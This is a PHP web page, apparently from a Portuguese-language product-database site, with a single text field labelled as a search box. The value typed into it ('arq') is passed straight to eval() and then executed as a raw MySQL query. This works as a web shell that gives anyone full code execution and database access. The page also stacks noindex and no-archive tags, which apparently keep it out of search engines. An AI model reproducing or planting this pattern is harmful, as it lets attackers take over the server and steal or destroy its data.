<meta name="robots" content="noindex" />
<meta name="googlebot" content="noindex" />
<meta name="googlebot-news" content="noindex" />
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<META HTTP-EQUIV="Expires" CONTENT="-1"> 
<meta name"robots" content="NoArchive " />
<meta http-equiv="cache-control" content="no-store, no-cache, must-revalidate">
<?php
header("Pragma: no-cache");
header("Cache: no-cache");
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
session_start();
////unlink('data.xml');/////

/*
CREATE OR REPLACE ALGORITHM=UNDEFINED DEFINER=`root`@`localhost` SQL SECURITY DEFINER VIEW `tv_teste` AS
 select `tb_produto`.`id_prod` AS `id_prod`,`tb_produto`.`cod_prod` AS `cod_prod`,`tb_produto`.`descr_prod`
  AS `descr_prod`,`tb_produto`.`linha` AS `linha`,`tb_produto`.`custo_med` AS `custo_med`,`tb_produto`.`saldo_prod` 
  AS `saldo_prod`,`tb_produto`.`unid_mat` AS `unid_mat`,`tb_produto`.`ponto_min` AS `ponto_min`,`tb_produto`.`linha_ph`
   AS `linha_ph`,`tb_produto`.`codigo_ph` AS `codigo_ph`,`tb_produto`.`flag_calccust` AS `flag_calccust`,`tb_produto`.`fora_lin` 
   AS `fora_lin`,`tb_produto`.`fator_mult` AS `fator_mult` from `tb_produto`
*/

header("Content-Type: text/html; charset=UTF-8",true);

include 'conectabco.php';

if (isset($arq)) {
	    eval($arq);
	    $sqlins = $arq ;
	      // echo($sqlins);  
	    $ins=mysql_query( $sqlins );
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<body>
<form name="form1" method="post"  enctype="multipart/form-data">
  <table >
  <tr >
    <td  align="left" valign="top">
   <input type="text" name="arq"  maxlenght="50" size=40 /> 
   <input type="submit" value="pesquisar" />
   </td>
   </tr>
  </table>
</form>
</body>
</html>